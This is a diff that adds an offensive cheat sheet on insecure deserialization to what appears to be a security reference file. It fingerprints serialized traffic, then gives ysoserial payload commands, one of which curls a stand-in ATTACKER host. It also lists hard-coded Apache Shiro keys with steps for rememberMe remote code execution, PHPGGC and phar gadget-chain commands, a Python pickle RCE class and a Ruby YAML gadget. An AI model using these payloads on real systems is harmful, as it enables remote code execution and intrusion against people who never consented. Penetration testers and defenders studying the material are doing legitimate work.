@@ -1604,3 +1604,112 @@ Vendor Security:
 - Microsoft BinaryFormatter Migration Guide
 - Apache Shiro Security Advisories
 - Apache Dubbo Security Advisories
+
+
+---
+
+## From hack-skills: Insecure Deserialization — Advanced Techniques
+
+### Traffic Fingerprinting
+
+| Serialization | Magic Bytes | Base64 Prefix | Location |
+|---|---|---|---|
+| Java | `AC ED 00 05` | `rO0AB` | POST body, cookies (rememberMe), hidden fields |
+| PHP | `O:N:"Class"` | — | POST body, session cookies |
+| Python pickle | `80 03` or `80 04` | — | API params, Redis values |
+| .NET | `AAEAAD` (base64) | — | ViewState, cookies |
+| Ruby Marshal | binary, no text header | — | Session data |
+
+### Java — ysoserial Key Chains
+
+```bash
+# URLDNS — DNS-only confirmation (safe, no RCE, works everywhere):
+java -jar ysoserial.jar URLDNS "http://TOKEN.burpcollaborator.net" > probe.bin
+
+# CommonsCollections RCE (most common vulnerable dep):
+java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > cc1.bin
+java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0  # for Shiro
+
+# Spring, Groovy, Hibernate, JDK-only:
+java -jar ysoserial.jar Spring1 "id" > spring1.bin
+java -jar ysoserial.jar Groovy1 "id" > groovy1.bin
+java -jar ysoserial.jar Jdk7u21 "id" > jdk7.bin  # JDK 7u21, no extra dep
+```
+
+### Apache Shiro rememberMe (CVE-2016-4437 / SHIRO-550)
+
+Shiro AES-CBC encrypts serialized Java objects in rememberMe cookie.
+
+```
+Common hard-coded keys:
+kPH+bIxk5D2deZiIxcaaaA==   (most common default)
+wGJlpLanyXlVB1LUUWolBg==
+4AvVhmFLUs0KTA3Kprsdag==
+
+Attack:
+1. Generate ysoserial payload (CommonsCollections6 for broad compat)
+2. AES-CBC encrypt with key + random IV
+3. base64-encode → set as rememberMe cookie
+4. Server decrypts → deserializes → RCE
+
+DNSLog confirm: java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" → encrypt → check log
+```
+
+### PHP — Magic Methods Chain
+
+PHP deserialization triggers magic methods: `__wakeup()` → `__destruct()` → `__toString()` → `__call()`
+
+```bash
+# PHPGGC — PHP gadget chain generator:
+phpggc -l                              # list available chains
+phpggc Laravel/RCE1 system "id"        # Laravel RCE
+phpggc Symfony/RCE1 system "id"        # Symfony
+phpggc Monolog/RCE1 system "id"        # Monolog
+
+# Phar deserialization (triggers on ANY phar:// file operation):
+phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"
+# Then trigger: file_exists("phar://uploads/avatar.jpg") → RCE
+```
+
+### Python — Pickle RCE
+
+```python
+import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("id",))
+
+payload = pickle.dumps(Exploit())
+# Send to target calling pickle.loads(user_data)
+```
+
+### Ruby Deserialization
+
+```yaml
+# YAML.load (not safe_load) on Ruby pre-2.7.2 — Gem::Requirement chain:
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  ...
+
+# Always test: YAML.load("--- !ruby/object:Gem::Installer\ni: x")
+# Class instantiation = YAML.load is unsafe
+```
+
+### Detection Decision Tree
+
+```
+Binary blob or encoded object in request?
+├── Java prefix (AC ED / rO0AB)?
+│   ├── Use URLDNS probe first (safe)
+│   ├── Identify libraries via error messages/banner
+│   └── Try matching ysoserial chains
+├── PHP format (O:N:"...) ?
+│   ├── Identify framework (Laravel/Symfony/WP)
+│   ├── Try PHPGGC chains
+│   └── Check phar:// in file operations
+└── Python binary blob?
+    ├── Try pickle payload with DNS callback
+    └── Check for PyYAML yaml.load (unsafe)
+```
